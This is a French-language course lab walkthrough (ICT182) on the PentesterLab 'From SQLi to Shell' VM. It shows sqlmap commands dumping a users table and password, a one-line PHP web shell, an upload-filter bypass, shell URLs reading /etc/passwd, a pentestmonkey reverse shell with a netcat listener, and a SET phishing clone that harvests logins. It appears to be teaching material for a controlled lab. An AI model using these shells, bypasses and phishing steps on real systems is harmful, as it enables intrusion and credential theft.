# ICT182 - Injection SQL

## Machine vulnérable

{% embed url="https://pentesterlab.com/exercises/from\_sqli\_to\_shell/course" %}

Télécharger [https://download.vulnhub.com/pentesterlab/from\_sqli\_to\_shell\_i386.iso](https://download.vulnhub.com/pentesterlab/from_sqli_to_shell_i386.iso) \(169 Mo**\)**

Créez une vm linux \(debian 6.0\) qui boot en live sur l’image iso from\_sqli\_to\_shell\_i386.iso

![](https://lh3.googleusercontent.com/Ue7pAmLhACCBAmbaisPnxJ9N5z4d1wkDL5Meo1lcOeMd5vtoYL1YsHIfJQtcRcafQeovUjMbyjS-6LwTJASVZd4CJRUtT3Q0f19vEFNfXNvHLrBGum4ZD_8L6gJDvBMm5CE5D7SQ)

```text
$ ip a
```

![](https://lh3.googleusercontent.com/e7XTM_loOpHv2j7X3wUvvQ4UeidyzB93v3QaqYX0HUjgeVYFQErSCdb0bomI6TbFyfzQeKV07NK65_61NV8Kt1s0AxItNVULc_KbcqZrahID0lgw8AxaF1on6V9P2sv_mP1p3UDY)

{% hint style="info" %}
Dans ce labortoire l'adresse IP de la machine vulnérable est 192.168.200.128
{% endhint %}

## **Kali Linux**

![](.gitbook/assets/image%20%2818%29.png)

Kali Linux est une distribution GNU/Linux sortie le 13 mars 20133, basée sur Debian. La distribution a pris la succession de BackTrack. L'objectif de Kali Linux est de fournir une distribution regroupant l'ensemble des outils nécessaires aux tests de sécurité d'un système d'information, notamment le test d'intrusion.

{% embed url="https://www.kali.org/" %}

### Installation d'une VM Kali Linux

Télécharger [http://old.kali.org/kali-images/kali-2020.4/kali-linux-2020.4-installer-netinst-i386.iso](http://old.kali.org/kali-images/kali-2020.4/kali-linux-2020.4-installer-netinst-i386.iso) \(330 Mo\)

![](https://lh3.googleusercontent.com/xw5I2Kl6JXgDUD9IOPxkSopL8w-oEFbvNpN_cfqVzjA7CNIqd1AnD_qPks__p7LwYRqbC8dJLKWSf1RfsbpaDjyTihQmzoMf6mMa7CyTlkAKoqw3y0fYhEsYZ9ZNuQSUDGLDX67a)

{% hint style="info" %}
Effectuez l'installation de Kali sans interface graphique et sans outils
{% endhint %}

![](https://lh6.googleusercontent.com/GtpU9044JIiFzzHJxK7g4Zdb5ivwi_Qb1uiR8m-z0jMuqRx-SEl5plBuQL6aQnw2Ll4q8_VXvon5R7pYkj2XTzRMNMqQJLoaGyuoajH6dB1FtsirqUdlD0lhRUNbCdMGkrALxqUk)

Contrôlez la configuration de votre interface réseau et démarrer le service ssh manuellement. Le service ssh doit être démarrer manuellement à chaque démarrage de la machine kali.

```text
$ sudo nano /etc/network/interfaces

allow-hotplug eth0
iface eth0 inet dhcp

$ sudo ifup eth0

$ sudo /etc/init.d/ssh start
```

### Connection SSH sur le client Kali

![](https://lh5.googleusercontent.com/AilBvvQxnkaumwxeC7hoEMByGCW2dqPct6Q3g-6A0_nC_m1kO4P8p6z-EzSgNFx5vWI3WnYkzbyc5ZeW5N8xrOB99Uy0dJwY2YlZVGJMnjMNcNIcRSv_HFF7MxYsPGR07VjTMZ46)

{% hint style="info" %}
Toutes le commandes qui vont suivre dans le laboratoire s'exécutent sur le client Kali à partir du client SSH
{% endhint %}

##  Fingerprinting : Recherche d'information sur le machine vulnérable

### **Netdiscover**

Il existe quantité d’outils de mapping réseau, ces outils permettant d’effectuer une écoute passive ou une découverte active du réseau pour essayer d’y trouver des hôtes via leur IP. C’est souvent l’une des ****premières phase d’une attaque informatique ou parfois utilisés lors des audits de réseaux informatiques. Bien que l’un des outils les plus avancés et connus soit **nmap**, il en existe d’autres comme **netdiscover** qui sont intéressant à connaitre et à utiliser. **netdiscover** ce différencie **d’nmap** par la méthode qu’il utilise pour effectuer la découverte du réseau.

**Netdiscover** est donc un outil de mapping réseau qui fonctionne via des requêtes **ARP** et nom via l’IP comme la plupart des outils. Il n’est surement pas le seul  à utiliser cette méthode mais il est plutôt simple d’utilisation et de fonctionnement.

```text
$ sudo apt install netdiscover
$ sudo netdiscover
```

![](https://lh5.googleusercontent.com/37ranSXih_9QSNdLGmPTFEFOytHYohW5CPicG-Hfq09NXRAHSdqoqrKCdcod8sPIFIsr7ei3j3r2i93Hy5fJ8fzx88rSaS_Eyfh4a-mqIeCpbFVuIf45giYqsSvcd4kA5PgkNmcH)

{% hint style="info" %}
192.168.200.128 est l'adresse IP de la machine vulnérable
{% endhint %}

### Nmap

{% embed url="https://nmap.org/" %}

**Nmap** est un scanner de ports libre créé par Fyodor et distribué par Insecure.org. Il est conçu pour détecter les ports ouverts, identifier les services hébergés et obtenir des informations sur le système d'exploitation d'un ordinateur distant.

```text
$ sudo apt install nmap
$ nmap 192.168.200.128
```

![](https://lh5.googleusercontent.com/_IzgFeq-LGtipgosy_cBnmoKb9iJOr09oOevKZnN7Ew_AVO7bQrV1ktptdiCURyOIVtZcvR-5XApd8SnXwoF_Ei0dSxdnVGBWe_z9t4O9rXL39g36FzrmFMzm8j_1YRC_2kwS0GM)

{% hint style="info" %}
Les ports 22 est 80 sont accessibles sur la machine vénérable
{% endhint %}

## Injection SQL

![](https://lh3.googleusercontent.com/MCFpdhR9rJscOTH-k5-Ib8sFzZXqT2VYT4TlSVXhoi4NIjKg9A56zBAn1OWG4DNOWW0GmOvWswmwh5dVRClz8NiB9Lw7xo_1gS__anOrgnMaNTehs9E1X1Turty7vkMOL0Ba1WLY)

Essayons de trouver si le site est vulnérable aux injections SQL

![](.gitbook/assets/image%20%2822%29.png)

Bingo, en ajoutant `'` au paramètre `id` du script `cat.php`, on obtient une erreur de syntaxe SQL. Techniquement, le code PHPqui se cache derrière cela est le suivant :

![](.gitbook/assets/image%20%2820%29.png)

La valeur fournie à l'utilisateur `($_GET["id])` est directement répercutée dans la requête SQL sur la ligne 3. Si un utilisateur tente d'accéder à l'URL `(/cat.php?id=2')`, la requête suivante sera exécutée `(SELECT * FROM articles WHERE id=2')`.

Cependant, la syntaxe de cette requête SQL est incorrecte à cause de l'unique guillemet `(')` et la base de données lancera une erreur qui est mauvaise.

{% hint style="info" %}
Ne montrez pas vos codes de débogage et d'erreur à un pirate
{% endhint %}

### **sqlmap**

{% embed url="http://sqlmap.org/" %}

Une injection SQL c’est le faite d’attaquer une base de données en envoyant des requêtes SQL afin d’essayer de récupérer des informations de la base de données \(structure, utilisateurs, mots de passe…\).

**Sqlmap** est un outil open source permettant d'identifier et d'exploiter une injection SQL sur des applications web. Outre la simple exploitation d'une injection SQL, il fournit également des fonctionnalités permettant la prise de contrôle de l'équipement hébergeant la base de données. Il est devenu aujourd'hui indispensable dans la trousse à outils de tout pentester. Cet article a pour objet de vous présenter les dernières fonctionnalités de l'outil, ainsi que son utilisation dans des cas pratiques.

Lors de l'utilisation de sqlmap sans aucune option particulière, l'outil va tout d'abord déterminer la possibilité d'injecter du code SQL dans l'un des paramètres de la requête HTTP fournie.

```text
$ sudo apt install sqlmap

$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --dbs
```

![](https://lh5.googleusercontent.com/dWJkQ1HuTO456ANTkrvUMfMV0Zao0UF5TxKT-VghfJyqoKGXzd7K1tDlC9lRKCjd7z20y6jGlRRTOuS_y3tj4mARHl6p0h-RLn4UkLYgBZtyqxTP79HlgcE_P0-IkVyZJ9LjlMng)

{% hint style="info" %}
Deux base de données sont présent dans la base de donnée MySQL information\_schema et photoblog
{% endhint %}

Maintenant que nous savons qu'une injection SQL est possible, nous souhaitons pouvoir extraire les informations présentes dans la base de données `photoblog`. 

Il est possible de lister les tables \(`--tables`\) et les colonnes \(`--columns`\) présentes dans la base de données, ainsi que de récupérer leur contenu \(`--dump`\). 

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --tables -D photoblog
```

![](https://lh3.googleusercontent.com/AO8x07j86fQAE-gqjPEhOGeaTRjxWCre8JXdZZl6a_n4h_tO3KH7kZziojKv5zfB7DnN95RA7wLZmBoBoTxTgRIJ0yO4_9FzFkdk2nXgI8wx0E2i7dKLdcnv79TwnEDXAXUzzv5d)

{% hint style="info" %}
3 tables sont présentes dans la base de données photoblog.
{% endhint %}

Intéressons-nous à la table `users`

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --columns -T users -D photoblog
```

![](https://lh3.googleusercontent.com/Bx7QmaP1QnOcs7WuOJ5__W7kf2qj8OqrMK38v7D7L_LYUrNYq_-c1y1wN6nJyVTQJty_4nrz0FOHziQfVRqDxESX21psVsEM0u985Qh1JS-SN7ayA1qFjO2MKL9MAAbS-Pvlu8XS)

{% hint style="info" %}
La table `users` contient bien les login est les mots de passe des utilisateurs
{% endhint %}

**Sqlmap** est en mesure d'identifier certains algorithmes de hachage couramment utilisés par les bases de données du marché, notamment : 

* les fonctions de hachage utilisées par MySQL, PostgreSQL, Microsoft SQL Server et Oracle afin de stocker les mots de passe de la base de données ;
* la fonction MD5 ;
* la fonction SHA-1.

Lorsque sqlmap identifie l'utilisation de l'une de ces fonctions, l'outil est en mesure d'effectuer une attaque par force brute ou par dictionnaire \(soit avec son dictionnaire intégré ou un dictionnaire pouvant être défini par l'utilisateur\) afin de retrouver la valeur du condensat.

```text
$ sqlmap --url='http://192.168.200.128/cat.php?id=1' --dump -T users -D photoblog
```

![](https://lh4.googleusercontent.com/yhIA0bf0Mu3MkeFf949b6jSNmks0DyJScob0yJqOnve1pYu6zw1X2BOwjqpWOwf_jhHsV0Yg3bDspdmGBBnd5BR6-LB3bxtqeM9gCwrrUmw2_UX0dzChR1djkEKCJ3p0YY16xHoe)

{% hint style="info" %}
Le mot de passe du compte `admin` est `P4ssw0rd`
{% endhint %}

## Installation d'un script Shell sur le serveur web

Maintenant que nous connaissons le mot de passe de l'admin nous pouvons nous connecter à l'interface de management des images du site pour y déposer un script php.

![](https://lh5.googleusercontent.com/QV2Q2-R_heHH89G7BglUyIEq3FvWoSzDAMS4swWOMcMQh6NWVTlaP5BhNOOH7wCVMvlZr_2Sm7ZZLiIV2roOdqBmMlUX1Sq9EpIswMf0H6mo_2GZ3GLY7HUos8EGNbPkLy-TZRvF)

![](https://lh5.googleusercontent.com/qcwb1xbur2PRCIBoOMwGg7vs1qrGdNgiu8EieNASoqzRaTmkQ-kwKx-Mv143SPlUe9186jd4UdUJiubwoEbEJVdSpsulNnT1dW4EaJQsk3sSGx09UicdPNV6n8jE8s8hoRwmvqvv)

Création d'un script **myshell.php** permettant d'exécuter des commande shell sur une machine.

```text
<?php
  system($_GET['cmd']);
?>  
```

Essayons de télécharger le script **myshell.php** sur le serveur en passant l'interface de management des images.

![](https://lh4.googleusercontent.com/rgVWBHSZt8yig0Su8vLFcMW-5wmFyoLLsdnLLUSC3Rwrtg_-XVkI_OT5bu14-ds4OmdlQh9KNevseWuiYq7yTL63qO79A8pH1NYo6c0tpMqRYssEiVjquODhV8_9ivwMchgOYHC8)

{% hint style="info" %}
Le site n'autorise pas le téléchargement de fichier PHP
{% endhint %}

![](https://lh5.googleusercontent.com/ORAUqtYxLgdwGfNtoTX0OVtH1MtT40X47LCXtGoId6nBVHz7ThSYE_pmtKDUgZnsdXuXMsrpAePj5IWXCn8HOzUq7fvnJWPPe1AI_siYQ-vD02OSx7_B-9qFjJ_oXr64s5cgkDH_)

Nous pouvons essayer de contourner cette sécurité en renommant le fichier \(Linux est sensible à la case\)

![](https://lh5.googleusercontent.com/iGYURs7TdRw3rVhKQPuQx0cfTvA-BjhOARy98QRWKsN_QXCPSVvjQis1b-1xh9zJcXel1kCAXOc9TpdF0fXG7K0wyjaBtR88c_y3yKmAA9Okr_ecxm6IdTuepnQPiZAR8qdx-N93)

![](https://lh5.googleusercontent.com/zIgUlwS4UjqVbWLiE2MSxk22Sif80IJ6res4rLxuOafrW6lEAPsie0yLdFnJAwhlPUQFMcuFUBBIW7pzvzQhnc9jhXCf7j7KXsH_zuF6b1Wn4bRkQiqDJdNvHsYOC6h0bY6ekwP3)

![](https://lh6.googleusercontent.com/Biz1nU852Rdfw5OwB4YxzmlAl9-lncqaytFJu3sSjx7AWYwD3w5SzPxSPburaItJW8YUTwIuKeDEHIX9lrNDrF2Z4a-TJeiRc05HveXdtRrFD90pd0fUFxr0BatPyKnI4OrkhYud)

Le script PHP **myshell.php** est à présent sur le serveur. En étudiant rapidement le code source de la page on arrive facilement à trouver le chemin pour pouvoir l'exécuter.

![](https://lh3.googleusercontent.com/S8mi83S4QgPCocfjdIA3Srl8dYR99-rTkJj3ghJTK4SNVr7ij5k3NrKU2R_joKNdvXis0fU4vv7BN8mr-r2P5adaED1V5jy6YZ-qLRyi5RPo9gyReK412_Q-Fy8E-ku519qTbsnL)

Nous pouvons tester a présent plusieurs combinaisons d'URL pour observer sont fonctionnent sur le serveur

{% embed url="http://192.168.200.128/admin/uploads/myshell.PHP" %}

![](https://lh3.googleusercontent.com/LfGQytEAlBk25ObT-OjAYwJ9h-QKghm_x5hLCRkPj1mpi8XO2EE4uEX2WxabruBGJYsz62iiDGPHSDybTr7wRmfgfUA5CeoODv8Q41RIM-lKc0aEKbKy--85Og7JXTz-1mWiFkAj)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=ls](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=ls

)

![](https://lh5.googleusercontent.com/Q6zAe_Z3bGPJfRu4i5gj5ifycZAXWMzyBd_ezdxuA8wJLhsALAgPj_e7V9tOnBT3L7q6Te6ejMD_gY738JJ-kFQHngsqDeBm9ubqQKm94W_ba5ovlA0_4eb0gUe-C9CqwvcvsazQ)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=uname -a](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=uname)

![](https://lh6.googleusercontent.com/fARo-VBvpcWJM13zkE7e22Zd7XNqaWNNZRthg9Q7EhAi3HWNJItCXMBGNvX66HsnMS-RMOdydjzE0XTd6a-C_eL8ekHrzO1kiLjne1-S4Ls3YvgOJn1vWShuyJ46zcjTW2JQekX1)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=cat /etc/passwd](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=cat)

![](https://lh6.googleusercontent.com/Owl-mHISJHWmBglIg_Gi68UhiVEVxuOY1jr8FuB9vLoDgZs4dRMNBFZ5YfjThjX8PoYWwIzAgy5TDSzsNr18heahSqiATo-7QuLU1lpUxHPXnsqWfbQSGcXNX-G6tjxMMH8USJAE)

### **Reverse-shell**

Il convient de clarifier dans un premier temps l’intérêt d’utiliser un **reverse-shell** et ce que c’est. Un **reverse-shell** n’est autre qu’un shell \(terminal/console\) contrôlé à distance par un utilisateur. Un shell simple se traduit par une attente de connexion sur un port précis par la machine à contrôler. L’utilisateur va se connecter sur ce port et récupérer le terminal interactif. Le **reverse-shell** est l’inverse : c’est l’utilisateur qui place un processus en écoute sur un port précis, et c’est la machine à contrôler qui établit la connexion vers la machine de l’utilisateur pour lui transmettre le contrôle de son terminal.

{% hint style="info" %}
L’intérêt du **reverse-shell** ? Plus besoin de se soucier des IPs des machines distantes à contrôler puisque ce sont elles qui se connectent à l’utilisateur. De plus, comme la connexion est sortante à partir de la machine à contrôler, les pare-feux/routeurs bloquent rarement ce type de flux.
{% endhint %}

{% embed url="https://github.com/pentestmonkey/php-reverse-shell/archive/master.zip" %}

Renommez le fichier **php-reverse-shell.php** en fichier **php-reverse-shell.php3** pour contourner la protection interdisant le téléchargement des fichier PHP sur le serveur.

![](https://lh4.googleusercontent.com/Mec_lu-uhwQRZiSlQsIJrB38SL7DaKxxxp_75CEkMHNEChlnY79e7l3eaDXNqyIVV2nI-3b2n8MOliQbizs4O9OR6I4P5FCM31RpQcBMgyC5mZf8c03UcTckV3dy5SIIokiyHaBr)

Modifier le fichier **php-reverse-shell** en indiquant l'adresse IP du client cible et du port à joindre.

![](https://lh4.googleusercontent.com/KIcQ6UwZiyY5yCI3ZtjSr1MWQw2f1TmvPv7hTHk0tUqiTWZQf3ma034kNZw2_obp7kDoVcNolOOr3cj8G2OiSmTMjK4eJC_YVN5KblP7Oz2HGhKaDwU453Zd0kY3g2x4BhnAl57A)

![](https://lh6.googleusercontent.com/-Dh9r_UdrKJUehcm1hIu-nmZMfNaOwC8McMgaGuA3TshxSKr2PlnJrk2t3AmFb_VuiIKoxK8ZKmfvGeOQcs5ep810z6GLFa2QmECOvHerJQko_eGFO9mH7_LHvgePN97E6wuEaYM)

Sur le client cible, lancez une commande netcast en écoute sur le port 1234 défini dans le fichier **php-reverse-shell** 

![](https://lh4.googleusercontent.com/eCaUPjsbnuAzpWWgCbZN6CCPq07_GjCofPKIi6oDAPNv2tjM3nkwTXnckWr8YzdxHBmcFtnmLahvGjwtmWTLr7eI14HtNdV6OSrwkLvBfgBUj4LO2uzslbVeaI2VORnGpCxf7SsX)

{% embed url="http://192.168.200.128/admin/uploads/php-reverse-shell.php3" %}

{% hint style="info" %}
Une fois le lien validé, le script PHP **php-reverse-shell** s'exécute sur le serveur et le client à accès à un shell complet du serveur limité au droit du processus apache.
{% endhint %}

![](https://lh3.googleusercontent.com/zT3VsihBolt7pVvh7rAjeL0sanv0dd0Ypa9GQkkApBPb9DbLDEgGd5XQjqMOi3Ee6iqKFj9yz4U76utontER9cEgffh32ieQCdq-wtjebN4TY4MXW-GiAG8_fo9pWmj5o_-tcsJk)

![](https://lh5.googleusercontent.com/RnenGk2Ji9b40l5jZ1TPpyHyRDeCsB2qvlo9xiyI_sIvFYMJiH4xu96u4ivTPY6ioqA1oVIeSJLrBT0r8UkYHN_-rRUTvQlsNlBkTgZZAgM45P2-QC03epTKKPFdaG9cxKdSA4-Z)

## **Social Engineering Toolkit**

**Social Engineering Toolkit** \(SET\), en français « boite à outils pour l'Ingénierie sociale », est un logiciel développé par TrustedSec et écrit par David Kennedy en python. Il est open-source et multiplateforme et propose un choix de fonctions permettant diverses attaques basées sur l'hameçonnage informatique. On retrouve ainsi pêle-mêle un outil pour copier des pages web contenant des formulaires \(Facebook, site de banque, etc.\), un outil de mail-bombing pour spammer des boites mails ou des numéros téléphone mais aussi des systèmes de gestion de RAT ou d'exploit en utilisant le framework Metasploit.

```text
$ git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
$ sudo apt install python python3-pip
$ cd setoolkit
$ pip3 install -r requirements.txt
$ sudo python setup.py

$ sudo setoolkit$
```

Nous allons créer en 6 étapes une copie parfaite du site **My Awesome Photoblog** qui va nous permettre de récupérer de façon transparente les information de connexion des utilisateurs

![](https://lh3.googleusercontent.com/ehcZhOo24ih7YnEsyI0MfeOZGQVmz6uJ1MyOMVxpvxyAp2tR5TkX5fAlRyVJ6-pecpCwiTEC8wtL7JHJXuatshnoTZcPvy440g_FBKREMmHVKU3XJHEDc9iu7G_OThCjB52aGhJJ)

![](https://lh4.googleusercontent.com/953NuJeEXYOj3g6tGyR4Vx3qyFJP5D6m7GAEBF18Mi_cPdRtjFESxyDTRxNT5PzxoDS8lQbxRVhEDbqZUMKGQj5B_TZMJEyrHWHWIL85aFlIW9m9A8geYFF8aasRcj0dciabF-IN)

![](https://lh6.googleusercontent.com/2bpbVoadiq7qTeyge0PAkNh5btMLj_IMh01zbsduO0OMnJalM_ppG5-aqm3cvNJogoIwREj5qT2WNfzKZMfzFW2Sd-MwZgcRG9Nt6Z-fe7SfNmCslJq379Ke3xvjKMrOx8e167Sk)

![](https://lh4.googleusercontent.com/KpWnLraUSLRPmisAJX2U80RwIRufUd5eY28B3xqylF8HZ50FIR95d6WcqTVUbFoF786Qzag-j7yuPoHMaVm0F8GJGbbDthgS7b8MPsXKbhRbQlQrBlg2YJh1l-A56ocThDw0rBiO)

![](https://lh4.googleusercontent.com/3DLA4LN3oFgCPvCGCoW5BvV2ZGYDXJHklSx_pwxhEBxvdvBJd4L3Z_MDFeWN9-Y_heujahfwVeHdBAGj5g7I5lbzTW2Jik3yc-vZJsHH5Pp9VpxT7xL5EpllfzGE72Jc5Dgx0VBc)

![](https://lh5.googleusercontent.com/q5GtFiFGW1mrW0zcRQKcU_M4rswZVI2fg75mNx2GWtwTN7e8qJhIn2KLulZtHCtze7CeTWBb7zxLNdIsQFzVzgSeK2FCAIdVYvYH4_ZkqoOIsTvbKse_xSVAeB8Q_8J8MniqQp_y)

Connectez vous sur le faux site est entrez vos identifiant de connexion

![](https://lh5.googleusercontent.com/HqrqSPudTsPwmxLhUFmHILRvvcBcZT7aacn0iksE1jTiEKr9JqE1UW937H4B0LCVHMkjSjnxO0-WH7M-cazmgKYNyOzqfz2UftUwZfW5-U_cz2Efrs6AKkOGPY2e8oPl_BrBwFZ9)

{% hint style="info" %}
Les informations rentrées sont transmises au pirates
{% endhint %}

![](https://lh3.googleusercontent.com/7inY-JEmLaeoRMfca2on1Wcf1hgEKreNmwflUnzMJLWd1ZFMR98g5soJ53_aapXqLgb7t7L00KZahgAP2RtHK2eIL16pT3ApG9SfxVJBEy3Y-338cMqVMoEO7i0v7eF_ZLdtJ148)

